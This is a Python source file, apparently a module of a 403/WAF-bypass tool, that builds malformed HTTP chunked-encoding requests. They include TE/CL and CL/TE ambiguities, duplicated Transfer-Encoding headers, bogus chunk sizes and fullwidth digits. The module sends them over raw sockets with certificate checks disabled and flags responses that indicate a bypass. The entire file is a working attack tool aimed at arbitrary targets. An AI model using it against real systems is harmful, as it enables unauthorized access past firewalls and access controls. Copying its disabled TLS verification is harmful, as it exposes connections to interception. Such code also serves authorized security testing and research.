import asyncio
import hashlib
import logging
import re
import ssl
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


class ChunkedEncodingEngine:

    def __init__(self, *, read_cap_bytes: int = 256 * 1024, timeout_sec: int = 12, max_concurrency: int = 6, ) -> None:
        self.read_cap_bytes = read_cap_bytes
        self.timeout_sec = timeout_sec
        self.max_concurrency = max_concurrency
        self.ssl_context = self._create_ssl_context()
        self._tokens = ["nuke403", "bypass", "probe", "admin"]
        self._builders = [
            self._build_standard_chunked,
            self._build_chunked_with_extensions,
            self._build_obfuscated_te_headers,   
            self._build_te_cl_ambiguity,       
            self._build_cl_te_ambiguity,      
            self._build_bad_size_non_hex,     
            self._build_bad_size_mismatch,      
            self._build_missing_final_crlf,     
            self._build_unicode_digit_size,     
            self._build_leading_ws_chunkline,  
        ]

        self._block_indicators = [
            "access denied",
            "forbidden",
            "unauthorized",
            "blocked",
            "not authorized",
            "captcha",
            "request blocked",
            "waf",
        ]

    async def generate_payloads(self, target_url: str, original_data: Dict) -> List[Dict[str, Any]]:
        payloads: List[Dict[str, Any]] = []
        body_tokens = self._tokens 

        for tok in body_tokens:
            for builder in self._builders:
                try:
                    built = builder(tok)
                    if isinstance(built, list):
                        for item in built:
                            payloads.append(item)
                    elif built:
                        payloads.append(built)
                except Exception as e:
                    logger.debug(f"[chunked] builder error {builder.__name__}: {e}")
        logger.info(f"[chunked] prepared {len(payloads)} payloads")
        return payloads

    async def test_payloads(self, target_url: str, payloads: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        parsed = urlparse(target_url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path_q = (parsed.path or "/") + (("?" + parsed.query) if parsed.query else "")

        baseline = await self._http11_baseline(parsed, port, path_q)
        if not baseline:
            logger.info("[chunked] baseline failed; skipping")
            return []

        sem = asyncio.Semaphore(self.max_concurrency)
        results: List[Dict[str, Any]] = []

        async def run_one(p: Dict[str, Any]) -> Optional[Dict[str, Any]]:
            try:
                async with sem:
                    snap = await self._raw_post(parsed, port, path_q, p["headers_list"], p["body"])
                if not snap:
                    return None

                verdict, reason = self._is_bypass(snap, baseline)
                if verdict:
                    return {
                        "technique": "chunked_encoding",
                        "label": p.get("label", ""),
                        "status_code": snap["status"],
                        "proof": {
                            "headers_diff": self._header_diff(baseline["headers"], snap["headers"]),
                            "body_len": snap["body_len"],
                            "body_md5": snap["body_md5"],
                            "first_bytes": self._first_bytes(snap["body"]),
                            "reason": reason,
                        },
                        "payload": {
                            "label": p.get("label", ""),
                            "headers_list": p.get("headers_list", []),
                        },
                    }
                return None
            except Exception as e:
                logger.debug(f"[chunked] payload run failed ({p.get('label','')}): {e}")
                return None

        tasks = [asyncio.create_task(run_one(p)) for p in payloads]
        for out in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(out, Exception):
                logger.debug(f"[chunked] task error: {out}")
                continue
            if out:
                results.append(out)
                
        seen = set()
        deduped: List[Dict[str, Any]] = []
        for it in results:
            key = (it.get("label", ""), it["proof"]["body_md5"], it.get("status_code", 0))
            if key not in seen:
                seen.add(key)
                deduped.append(it)

        return deduped

    def _build_standard_chunked(self, token: str) -> Dict[str, Any]:
        body = self._chunk_body([token.encode("utf-8")])
        return self._payload("std_chunked", [("Transfer-Encoding", "chunked")], body)

    def _build_chunked_with_extensions(self, token: str) -> Dict[str, Any]:
        body = self._chunk_body([token.encode("utf-8")], use_extension=True)
        return self._payload("chunked_ext", [("Transfer-Encoding", "chunked")], body)

    def _build_obfuscated_te_headers(self, token: str) -> Dict[str, Any]:
        hdrs = [
            ("Transfer-Encoding", "chunked"),
            ("transfer-encoding", "identity"),     
            ("X-Transfer-Encoding", "chunked"),  
        ]
        body = self._chunk_body([token.encode("utf-8")])
        return self._payload("obf_te_dup", hdrs, body)

    def _build_te_cl_ambiguity(self, token: str) -> Dict[str, Any]:
        body = self._chunk_body([token.encode("utf-8")])
        cl = str(len(body)) 
        hdrs = [("Transfer-Encoding", "chunked"), ("Content-Length", cl)]
        return self._payload("te_cl", hdrs, body)

    def _build_cl_te_ambiguity(self, token: str) -> Dict[str, Any]:
        body = self._chunk_body([token.encode("utf-8")])
        cl = str(len(body))
        hdrs = [("Content-Length", cl), ("Transfer-Encoding", "chunked")]
        return self._payload("cl_te", hdrs, body)

    def _build_bad_size_non_hex(self, token: str) -> Dict[str, Any]:
        body = b"Z\r\n" + token.encode("utf-8") + b"\r\n0\r\n\r\n"
        return self._payload("bad_size_nonhex", [("Transfer-Encoding", "chunked")], body)

    def _build_bad_size_mismatch(self, token: str) -> Dict[str, Any]:
        declared = b"A" 
        actual = token.encode("utf-8")       
        body = declared + b"\r\n" + actual + b"\r\n0\r\n\r\n"
        return self._payload("bad_size_mismatch", [("Transfer-Encoding", "chunked")], body)

    def _build_missing_final_crlf(self, token: str) -> Dict[str, Any]:
        first = token.encode("utf-8")
        body = self._chunk_line(len(first)) + first + b"\r\n0\r\n"
        return self._payload("missing_final_crlf", [("Transfer-Encoding", "chunked")], body)

    def _build_unicode_digit_size(self, token: str) -> Dict[str, Any]:
        fw7 = "７".encode("utf-8")
        body = fw7 + b"\r\n" + token.encode("utf-8") + b"\r\n0\r\n\r\n"
        return self._payload("unicode_size_fullwidth7", [("Transfer-Encoding", "chunked")], body)

    def _build_leading_ws_chunkline(self, token: str) -> Dict[str, Any]:
        first = token.encode("utf-8")
        body = b"  " + self._chunk_line(len(first)) + first + b"\r\n0\r\n\r\n"
        return self._payload("leading_ws_chunkline", [("Transfer-Encoding", "chunked")], body)

    def _is_bypass(self, snap: Dict[str, Any], base: Dict[str, Any]) -> Tuple[bool, str]:
        status = snap["status"]
        text_l = snap["body"].lower()

        if any(tok in text_l for tok in self._block_indicators):
            return (False, "")
        
        if base["status"] not in (401, 403, 404):
            strong_shift = (snap["body_md5"] != base["body_md5"]) and (snap["headers"].get("set-cookie", "") != base["headers"].get("set-cookie", ""))
            if strong_shift and (200 <= status < 400):
                return (True, "content_and_cookie_shift_without_blocked_baseline")
            return (False, "")

        if 200 <= status < 300:
            if snap["body_len"] > 50 and snap["body_md5"] != base["body_md5"]:
                return (True, "2xx_with_nonerror_body_and_delta")

        if 300 <= status < 400:
            loc = snap["headers"].get("location", "")
            if loc and (loc != (base["headers"].get("location", ""))):
                return (True, "3xx_with_location_delta")

        if (snap["body_md5"] != base["body_md5"]) or (snap["headers"].get("set-cookie", "") != base["headers"].get("set-cookie", "")):
            if status != base["status"]:
                return (True, "status_and_body_or_cookie_delta")

        return (False, "")

    async def _raw_post(
        self,
        parsed,
        port: int,
        path_q: str,
        headers_list: List[Tuple[str, str]],
        body: bytes,
    ) -> Optional[Dict[str, Any]]:
        host = parsed.hostname or ""
        timeout = self.timeout_sec

        base_lines = [
            f"POST {path_q} HTTP/1.1",
            f"Host: {host}",
            "Connection: close",
            "Accept: */*",
        ]

        for k, v in headers_list:
            base_lines.append(f"{k}: {v}")

        base_lines.append("") 
        request = ("\r\n".join(base_lines) + "\r\n").encode("latin-1", errors="ignore") + (body or b"")

        try:
            if (parsed.scheme == "https") or (port == 443):
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port, ssl=self.ssl_context, server_hostname=host),
                    timeout=timeout,
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port),
                    timeout=timeout,
                )

            writer.write(request)
            await writer.drain()

            raw = await self._read_until(reader, b"\r\n\r\n", timeout)
            if raw is None:
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                return None

            status, headers = self._parse_headers(raw.decode("latin-1", errors="ignore"))
            body_text = await self._read_body(reader, headers, timeout)

            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            body_b = body_text.encode("utf-8", errors="ignore")
            return {
                "status": status,
                "headers": {k.lower(): v for k, v in headers.items()},
                "body": body_text,
                "body_md5": hashlib.md5(body_b).hexdigest(),
                "body_len": len(body_b),
            }
        except Exception as e:
            logger.debug(f"[chunked] raw_post error: {e}")
            return None

    async def _http11_baseline(self, parsed, port: int, path_q: str) -> Optional[Dict[str, Any]]:
        host = parsed.hostname or ""
        timeout = self.timeout_sec
        form = b"probe=baseline"
        req = (
            f"POST {path_q} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: close\r\n"
            "Accept: */*\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(form)}\r\n"
            "\r\n"
        ).encode("latin-1", errors="ignore") + form
        try:
            if (parsed.scheme == "https") or (port == 443):
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port, ssl=self.ssl_context, server_hostname=host),
                    timeout=timeout,
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port),
                    timeout=timeout,
                )

            writer.write(req)
            await writer.drain()

            raw = await self._read_until(reader, b"\r\n\r\n", timeout)
            if raw is None:
                writer.close(); 
                try: 
                    await writer.wait_closed()
                except Exception: 
                    pass
                return None

            status, headers = self._parse_headers(raw.decode("latin-1", errors="ignore"))
            body_text = await self._read_body(reader, headers, timeout)

            writer.close(); 
            try:
                await writer.wait_closed()
            except Exception:
                pass

            body_b = body_text.encode("utf-8", errors="ignore")
            return {
                "status": status,
                "headers": {k.lower(): v for k, v in headers.items()},
                "body_md5": hashlib.md5(body_b).hexdigest(),
                "body_len": len(body_b),
            }
        except Exception as e:
            logger.debug(f"[chunked] baseline error: {e}")
            return None

    async def _read_until(self, reader: asyncio.StreamReader, sep: bytes, timeout: int) -> Optional[bytes]:
        try:
            buf = b""
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                buf += chunk
                i = buf.find(sep)
                if i >= 0:
                    return buf[: i + len(sep)]
                if len(buf) > 256 * 1024:
                    return None
            return None
        except Exception:
            return None

    def _parse_headers(self, header_blob: str) -> Tuple[int, Dict[str, str]]:
        lines = header_blob.split("\r\n")
        status_line = lines[0] if lines else "HTTP/1.1 000"
        m = re.search(r"\s(\d{3})\s?", status_line)
        code = int(m.group(1)) if m else 0
        headers: Dict[str, str] = {}
        for line in lines[1:]:
            if not line or ":" not in line:
                continue
            k, v = line.split(":", 1)
            headers[k.strip()] = v.lstrip()
        return code, headers

    async def _read_body(self, reader: asyncio.StreamReader, headers: Dict[str, str], timeout: int) -> str:
        try:
            if headers.get("Transfer-Encoding", "").lower().startswith("chunked"):
                return await self._read_chunked(reader, timeout)

            length = headers.get("Content-Length")
            if length and length.isdigit():
                n = min(int(length), self.read_cap_bytes)
                data = await asyncio.wait_for(reader.readexactly(n), timeout=timeout)
                return data.decode(self._guess_encoding(headers), errors="ignore")

            data = b""
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                data += chunk
                if len(data) > self.read_cap_bytes:
                    break
            return data.decode(self._guess_encoding(headers), errors="ignore")
        except Exception:
            return ""

    async def _read_chunked(self, reader: asyncio.StreamReader, timeout: int) -> str:
        data = b""
        try:
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=timeout)
                if not line:
                    break
                line = line.strip()
                m = re.match(rb"^([0-9A-Fa-f]+)", line)
                if not m:
                    break
                size = int(m.group(1), 16)
                if size == 0:
                    await asyncio.wait_for(reader.readline(), timeout=timeout) 
                    break
                chunk = await asyncio.wait_for(reader.readexactly(size), timeout=timeout)
                data += chunk
                await asyncio.wait_for(reader.readline(), timeout=timeout) 
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return data.decode("utf-8", errors="ignore")

    def _guess_encoding(self, headers: Dict[str, str]) -> str:
        ct = headers.get("Content-Type", "")
        m = re.search(r"charset=([A-Za-z0-9_\-]+)", ct, re.I)
        return m.group(1) if m else "utf-8"

    def _payload(self, label: str, headers_list: List[Tuple[str, str]], body: bytes) -> Dict[str, Any]:
        return {"label": label, "headers_list": headers_list, "body": body}

    def _chunk_line(self, n: int, *, with_ext: bool = False) -> bytes:
        line = f"{n:x}".encode("ascii")
        if with_ext:
            line += b";ext=1"
        return line + b"\r\n"

    def _chunk_body(self, parts: List[bytes], *, use_extension: bool = False) -> bytes:
        out = b""
        for p in parts:
            out += self._chunk_line(len(p), with_ext=use_extension)
            out += p + b"\r\n"
        out += b"0\r\n\r\n"
        return out

    def _create_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.minimum_version = ssl.TLSVersion.TLSv1
        except Exception:
            pass
        return ctx

    def _first_bytes(self, data: str, n: int = 120) -> str:
        return data[:n]

    def _header_diff(self, h0: Dict[str, str], h1: Dict[str, str]) -> Dict[str, Tuple[str, str]]:
        diff: Dict[str, Tuple[str, str]] = {}
        keys = set(h0.keys()) | set(h1.keys())
        for k in sorted(keys):
            v0 = h0.get(k, "")
            v1 = h1.get(k, "")
            if v0 != v1:
                diff[k] = (v0[:160], v1[:160])
        return diff
